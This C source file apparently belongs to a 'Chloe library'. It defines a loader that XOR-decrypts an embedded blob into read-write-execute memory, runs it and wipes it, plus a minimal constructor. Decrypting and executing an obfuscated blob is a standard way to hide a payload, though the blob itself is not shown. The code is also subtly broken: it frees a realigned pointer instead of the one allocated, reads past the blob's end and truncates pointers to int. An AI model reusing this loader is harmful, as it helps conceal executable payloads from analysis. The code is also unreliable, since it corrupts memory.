/*
 * Chloe library: the decrypt-and-run loader and the state constructor.
 */

#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/cachectl.h>
#include "chloe.h"

/* Decrypts the blob between ChloeDoushite and ChloeUsotsuki into a fresh
   page-aligned RWX buffer (XOR with a running key that accumulates each
   encrypted byte rotated left by 3), flushes the caches, calls it with `p`
   and wipes it. Both the buffer pointer and the size are realigned in place,
   so the error path frees the aligned pointer. */
int ChloeMaple(ChloeObj *p)
{
	int size = (int)ChloeUsotsuki - (int)ChloeDoushite;
	unsigned char *buf;
	int i;
	unsigned int key;

	if (p->pageSize == 0)
		return -1;

	buf = (unsigned char *)malloc(size + p->pageSize * 4);
	if (buf == 0)
		return -errno;

	memset(buf, 0, size + p->pageSize * 4);

	buf = (unsigned char *)(((unsigned int)buf + p->pageSize) - (unsigned int)buf % p->pageSize);
	size = (size + p->pageSize) - (unsigned int)size % (unsigned int)p->pageSize;

	if (mprotect(buf, size, PROT_READ | PROT_WRITE | PROT_EXEC) < 0) {
		free(buf);
		return -errno;
	}

	key = 35;
	for (i = 0; i < size; i++) {
		unsigned char b = ChloeDoushite[i];
		buf[i] = b ^ key;
		key = (key + (((b << 3) & ~7) | (b >> 5))) & 0xff;
	}

	cacheflush(buf, size, 3);
	((void (*)(ChloeObj *))buf)(p);
	memset(buf, 0, size);
	return 0;
}

/* Minimal constructor. */
int ChloeRings(ChloeObj *p, int memSize)
{
	p->hash = 0x12345678;
	p->memSize = memSize;
	p->pageSize = getpagesize();
	p->blobAddr = (int)ChloeKnife;
	return 0;
}
